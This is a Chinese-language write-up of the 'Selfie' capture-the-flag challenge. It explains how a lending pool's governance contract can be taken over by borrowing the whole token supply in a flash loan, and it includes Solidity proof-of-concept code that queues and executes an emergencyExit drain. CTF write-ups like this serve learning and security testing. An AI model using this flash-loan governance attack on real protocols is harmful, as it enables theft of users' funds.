# Selfie (24/09/05)

## 题目介绍

> **自拍**
>
> **一个新的贷款池已经启动！它现在正在提供DVT代币的快速贷款。它甚至包括一个花哨的治理机制来控制它。**
>
> **什么会出错，对吗？**
>
> **你从没有DVT代币开始平衡，池有150万存在风险。**
>
> **从池中抢救所有资金，并将其存入指定的回收账户。**

## 合约分析

一共有两个合约文件还有一个接口文件，题目当中提到了治理机制刚好有个SimpleGovernance的治理合约还有一个闪电贷的合约。

看了下治理合约有创建和执行治理操作的函数。函数第一行就在检查是否有足够多的票数。刚好可以配合闪电贷拿到足够的token创建交易。在等待2天以后的时间才可以执行。

``` solidity
       function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender)) {
            revert NotEnoughVotes(msg.sender);
        }

        if (target == address(this)) {
            revert InvalidTarget();
        }

        if (data.length > 0 && target.code.length == 0) {
            revert TargetMustHaveCode();
        }

        actionId = _actionCounter;

        _actions[actionId] = GovernanceAction({
            target: target,
            value: value,
            proposedAt: uint64(block.timestamp),
            executedAt: 0,
            data: data
        });

        unchecked {
            _actionCounter++;
        }

        emit ActionQueued(actionId, msg.sender);
    }
    //检查是否有足够的票数。
    function _hasEnoughVotes(address who) private view returns (bool) {
    //需要委托给攻击合约。
        uint256 balance = _votingToken.getVotes(who);
        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
        return balance > halfTotalSupply;
    }
    //执行交易 
    function _canBeExecuted(uint256 actionId) private view returns (bool) {
        GovernanceAction memory actionToExecute = _actions[actionId];

        if (actionToExecute.proposedAt == 0) return false;

        uint64 timeDelta;
        unchecked {
            timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;
        }

        return actionToExecute.executedAt == 0 && timeDelta >= ACTION_DELAY_IN_SECONDS;
    }
```



## 解题过程

1.闪电贷全部的token。

2.委托投票给攻击合约，创建恶意交易data包含**emergencyExit**函数进行提款。

3.创建交易然后vm.warp延长两天时间执行交易id。最后把钱转到恢复账户。

**POC**

``````solidity
  function attack()public {
        token.approve(address(pool),type(uint256).max);
        pool.flashLoan(this, address(token), 1500000 ether,"0xx");
        vm.warp(block.timestamp + 2 days);
        governance.executeAction(1);
        token.transfer(address(recovery),token.balanceOf(address(this)));
    }
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) public  returns (bytes32){
        console.log("token balance",DamnValuableVotes(token).balanceOf(address(this)));
        DamnValuableVotes(token).delegate(address(this));
        bytes memory datas=abi.encodeWithSignature("emergencyExit(address)", address(this));
        governance.getVotingToken();
        governance.queueAction(address(pool),0,datas);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
``````
